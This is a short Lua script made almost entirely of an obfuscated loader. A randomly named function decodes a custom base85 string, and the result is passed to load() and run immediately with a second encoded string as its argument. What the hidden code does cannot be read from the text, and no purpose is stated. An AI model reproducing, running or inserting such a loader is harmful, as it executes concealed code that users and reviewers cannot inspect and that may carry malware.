
local function KUbXTMOQoR(s)
    local m = {}
    local c = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
    for i=1,85 do m[string.byte(c,i)] = i-1 end
    local o, v, n, p = {}, 0, 0, {52200625, 614125, 7225, 85, 1}
    for i=1, #s do
        local x = m[string.byte(s,i)]
        if x then
            v = v + x * p[n+1]
            n = n + 1
            if n == 5 then
                table.insert(o, string.char(math.floor(v/16777216), math.floor((v%16777216)/65536), math.floor((v%65536)/256), v%256))
                v, n = 0, 0
            end
        end
    end
    return table.concat(o)
end
assert(load(KUbXTMOQoR("3LqdLAZ%}AVQe65XL?gZX=Y4RRv<kfb98cPZf7oIXkl_FGdL?VF)TGSD=|4NG&L(SIV>_VD>E}JF)}qRGBzwZGAl7PEHN=REi*YRIW#RaGb}MPFfB7OEHO1JGd3(SG%+nQH!L|hEiy4IF)=VLG&3wXFe@`SEHyJLGd3(YH7znSEHg1HGc+tWG%GVQEHN@TEi^PNHZ?0UF)T4NI4v<bEHN}TEiyDLHaROaGAuSQD>FGPGc_wTGb}MQFfB4SEHpSPGcznVHY+nQEHgMOG%zeUH7znQEHyJLF*PhVGb=JTDGDGUARugSV_|F{W_503bZKvHAXH6nQBGw=SxiePVJu=PAZ%}AVQe69EMq+}EHFDDcW7yBWguZbFd$)WWFTTbFd$@aAZ%}AVQe6BVJvcDJz*s>EMg@xJ0NLhAaY@TJ#u0obZBL6AY(maD{vrXZe%+kVJu=Sa6KqtEplNgFET7BVl8rFDK9cCa4Ir8AZ2c3J0NLhAYnXWAarPDZXjVjVjyL1WIG^tXlZO^AYnc*AY^YKY;R*>Y#?%BJz*s>J0NLhAaY?oFd%ejWo{s2J!30yAZ2c3J0M{!a6KqtEplNgFET7}Dl$7DWo~3UAaZ4Nb#iVXV>=*aZe%+OARr(hY;R*>Y#?TJZew(5Z*Cw(S$b<qbWul4Y$#+bAZsZKARr(hARr(hY;R*>Y#?(WJs^91AZBlJAZa}?EHX7UAY^YKb6aU$J!v3iZe$7|ARr(hARr)YZ)0I>AZj2zATSCbARr(hARr)SZ*m}MJuoaXH8mh)ZweqFARr(hARr(hARuZWJs>D*AS)nqTWMV&D<E@pa%pa7E@F9fWhiSbASh`dB_JbfDIhB#F)1k^B_J|2HVPmhARr(hARr(hARu#FX<aNJb6aX%AUz;+TWVb_Aah%3T?!x|ARr(hARuLKWC|c4ARr(hARugSV_|F{X)GXbb#x#-ATTT-dwmKZARr(hARr)WAUz;33LqdLARr(hAZBlJAZcWHJuxgGBV-_CZweqFARr(hARr(hARuWVJs>D)AS)m-DIg^vGBq{|ARr(hARr(hARr(hY9KuzC~6=pAah%3T`3?XATl*J3LqdLARr(hARr(hAah%3T`VATTWVb(Js@*iYF#WKb6aU$3LqdLARr(hARr(hAa8YaTO)6EbSp7kAUz;+baH8KXD(xCVR9%`O>a?7Wkp#`ODJ=6a%pa7E@F9fWhi7UAZcWHDJ&p!TPSl|X<Z;IAah%4T`3?XATl*JT`4IFARr(hARr(hWo~2&ARr(hARr(ha%FUNa&91WVPb4$E@N+QV_|eCZ*_Dj3LqdLAZ2c33LqdLAaZ4Nb#iVXW_503bZKvHC~#k5I5jB>ARr(hARr(hY;R*>Y#?o6a3DP(dwmKZARr(hARr)YZ)0I>AY*7@a&sU(AR;g^GBY$aHa9pqK|(`BMMg(RNlHshO-@fxQBqS>RaRG6Sz2LYV`OD!XJ~0^Yiw<9Z*XyPb98lfcX)YvAtNLuCMYQ?D=j-bJw87`USD8)e0_c*3LqdLARr(hAZBlJAZa}@EI2hFWN#pCVQ^b>baH8KXD(uSbY&=GXkl`5ENLlSAUz;yEioWvZe$7|ARr(hARr)YZ)0I>Aa8YaEFgAaY%CySZ*^{TAUz;^eJmg_EFdrnARr(hARr(hY;R*>Y#?xNcXJ>;AbT}3GB7YUGBqq9HZe3YGBqq9H!?CcEFd^FEFdv`3LqdLARr(hAZBlJAZa}@EFdFrUt%~lAY^X}ARr(hARr(hARr(hY;R*>Y#??ZJs@pia9eY9a%pa7E@F9fWhii8VmLJ{AZaOG3LqdLARr(hARr(hAZcbGb|7?UWo`-}ARr(hARr(hARr(hARr)iVQe5hAa-GFAS)ntASxhmZ+CNBV{dhCbSp7k3LqdLARr(hARr(hARr(hAY*TJZge0$AY*TJZge0kATbIcARr(hARr(hARr(hARr)VW*}p4b#8PZJv|^bAarPDZVDhEARr(hARr(hARr(hARr(hARu&MVr*qDX>N06a&#zfb#yEsb98cPZf7oIXkl_FZDDk1E@o_RZ*nMhVQeokHa9mnGBGwOEFf)RbZ9PSY;SLJC@6MeY$Y)^H#avjF*YeLHZ?UfHYqG1ZDDk1E@o_RZ*nLoc42HKHZ?UfHYqPMH8v?MAa-GFB{DTODJcpdARr(hARr(hARr(hARr(hARr)iVQefQV{dhCbRaz-Ff1T23LqdLARr(hARr(hARr(hAZ2c33LqdLARr(hARr(hAZ2c33LqdLARr(hAZ2c33LqdLARr(hAZ%}AVQe5|Wn*%AaCBv4AUz;OS$b<qbWul4Y$$YLVr*qDV{dL_VRR^Ob#y5#AZ%xPQ$uNHOjK4W3LqdLARr(hAYpTJWpZ>VY;R#?C}d@0a(QrcWn?KSC@BgcARr)RZe$7|ARr(")))()("1Drf3mg~^3E?~A)ikg0cIoEE-H#PC~%7w}Yq5}t4R4k&p98mTIAlQwWc>TRwF?A{qJB!SarNdJHB3VG3$2a)2s9rN>Yd3>KUq(E+_VG|>tF8(`x&")
